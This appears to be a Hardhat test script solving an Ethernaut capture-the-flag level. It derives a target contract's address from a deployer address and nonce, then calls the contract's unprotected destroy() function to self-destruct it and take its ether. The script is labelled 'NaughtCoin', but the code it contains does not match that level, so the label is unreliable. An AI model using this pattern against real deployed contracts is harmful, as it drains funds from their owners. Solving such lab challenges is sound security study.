import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("NaughtCoin", function(){
    it("Aims to Solve the NaughtCoin Question of the Ethernaut CTF", async function() {
        
        this.timeout(0);

        // Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Get Target Address
        let targetAddr = ethers.utils.getContractAddress({
            from: "0x2208f22Da2BbC01669fD3f70876340F12432C2f6",
            nonce: ethers.BigNumber.from(`1`),
        });
        

        // Connect to the Target Contract
        const targetABI = [
            "function destroy(address payable _to) public",
        ]

        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        // Trigger Self Destruct
        let transaction = await targetCont.destroy(eoa.address);
        await transaction.wait();



    });
});